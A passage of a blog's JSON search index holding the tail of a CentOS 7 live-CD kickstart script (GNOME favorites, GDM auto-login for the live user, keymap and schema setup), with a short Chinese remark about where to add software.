class=\"k\"\u003e[org.gnome.shell]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efavorite-apps\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e[\u0026#39;liveinst.desktop\u0026#39;,\u0026#39;firefox.desktop\u0026#39;, \u0026#39;evolution.desktop\u0026#39;, \u0026#39;empathy.desktop\u0026#39;, \u0026#39;rhythmbox.desktop\u0026#39;, \u0026#39;shotwell.desktop\u0026#39;, \u0026#39;libreoffice-writer.desktop\u0026#39;, \u0026#39;nautilus.desktop\u0026#39;, \u0026#39;gnome-documents.desktop\u0026#39;, \u0026#39;anaconda.desktop\u0026#39;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set up auto-login\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt; /etc/gdm/custom.conf \u0026lt;\u0026lt; FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[daemon]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eAutomaticLoginEnable\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eAutomaticLogin\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eliveuser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn off PackageKit-command-not-found while uninstalled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -f /etc/PackageKit/CommandNotFound.conf ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003esed -i -e \u0026#39;s/^SoftwareSourceSearch\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003etrue/SoftwareSourceSearch=false/\u0026#39; /etc/PackageKit/CommandNotFound.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make sure to set the right permissions and selinux contexts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echown -R liveuser:liveuser /home/liveuser/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erestorecon -R /home/liveuser/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Fixing default locale to us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elocalectl set-keymap us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elocalectl set-x11-keymap us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# rebuild schema cache with any overrides we installed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eglib-compile-schemas /usr/share/glib-2.0/schemas\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，上面注释了两个地方，都可以添加软件或者运行脚本\u003c/p\u003e","title":"CentOS 7 Live-CD 的制作"},{"content":"","permalink":"https://rendoumi.com/posts/untitled/","summary":"","title":""}]